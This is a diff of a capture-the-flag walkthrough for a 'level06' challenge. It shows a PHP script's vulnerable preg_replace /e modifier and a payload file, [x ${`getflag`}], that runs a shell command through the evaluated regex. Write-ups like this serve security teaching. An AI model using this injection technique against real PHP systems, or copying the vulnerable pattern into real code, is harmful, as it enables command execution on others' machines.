@@ -1,7 +1,5 @@
 $> nm -u level06
-         w _Jv_RegisterClasses
-         w __gmon_start__
-         U __libc_start_main@@GLIBC_2.0
+[...]
          U execve@@GLIBC_2.0
          U free@@GLIBC_2.0
          U getegid@@GLIBC_2.0
@@ -9,6 +7,8 @@ $> nm -u level06
          U setresgid@@GLIBC_2.0
          U setresuid@@GLIBC_2.0
          U strdup@@GLIBC_2.0
+
+
 $> cat level06.php
 #!/usr/bin/php
 <?php
@@ -16,9 +16,21 @@ function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", 
 function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
 $r = x($argv[1], $argv[2]); print $r;
 ?>
-$> # We can see the php script use the deprecated and vunerable regex 'e' modifier
-$> # So the "/(\[x (.*)\])/e" regex will evaluate anything into the ".*" and call the 'y' function with it
-$> # We write an exploit file to math the regex above
+
+# We can see the php script use the deprecated and vunerable regex 'e' modifier
+# So the "/(\[x (.*)\])/e" regex will evaluate anything into the ".*" and call the 'y' function with it
+# We write an exploit file to match the regex above
+
+$> strings level06
+[...]
+/home/user/level06/level06.php
+[...]
+
+# The binary calls the vulnerable functions defined in the PHP file
+
 $> cat /dev/shm/exploit
 [x ${`getflag`}]
-$> # Thank to php variable variables, this will produce an error as the code will attempt to print the content of a variable name. This variable name equals to `getflag` return value
+
+$> ./level06 /dev/shm/exploit
+
+# Thank to php variable variables, this will produce an error as the code will attempt to print the content of a variable name. This variable name equals to `getflag` return value
